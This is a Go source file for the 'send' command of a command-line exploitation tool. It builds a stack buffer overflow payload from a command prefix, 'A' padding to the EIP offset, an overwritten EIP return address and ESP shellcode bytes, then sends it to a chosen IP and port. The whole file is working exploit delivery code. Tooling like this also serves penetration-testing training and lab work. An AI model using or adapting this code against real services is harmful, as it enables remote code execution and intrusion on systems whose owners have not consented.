/*
Copyright © 2021 Souvik Haldar <souvikhaldar32@gmail.com>

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/
package cmd

import (
	"fmt"
	"strings"

	"github.com/souvikhaldar/goffer/pkg/webfuzz"
	"github.com/spf13/cobra"
)

var eip []byte
var eipAddr int
var esp []byte

// sendCmd represents the send command
var sendCmd = &cobra.Command{
	Use:   "send",
	Short: "Send payload to server",
	Long:  ``,
	Run: func(cmd *cobra.Command, args []string) {
		fmt.Println("send called")

		garbage := strings.Repeat("A", eipAddr)
		fmt.Println("Len of garbage: ", len(garbage))
		fmt.Println("Len of eip: ", len(eip))
		fmt.Printf("EIP in hex: %x\n", eip)
		fmt.Printf("ESP in hex: %x\n", esp)
		payload := []byte(command + garbage)
		payload = append(payload, eip[:]...)
		payload = append(payload, esp[:]...)

		if err := webfuzz.SendPayload(
			ip,
			port,
			payload,
			poolSize,
		); err != nil {
			fmt.Println("Unable to fuzz: ", err)
		}
	},
}

func init() {
	rootCmd.AddCommand(sendCmd)
	sendCmd.Flags().BytesHexVar(&eip, "eip", nil, "The value to overwrite EIP")
	sendCmd.Flags().IntVarP(&eipAddr, "eip-address", "a", 0, "starting address of EIP")
	sendCmd.Flags().BytesHexVar(&esp, "esp", nil, "The value to send to the stack starting at address esp")

	// Here you will define your flags and configuration settings.

	// Cobra supports Persistent Flags which will work for this command
	// and all subcommands, e.g.:
	// sendCmd.PersistentFlags().String("foo", "", "A help for foo")

	// Cobra supports local flags which will only run when this command
	// is called directly, e.g.:
	// sendCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")
}
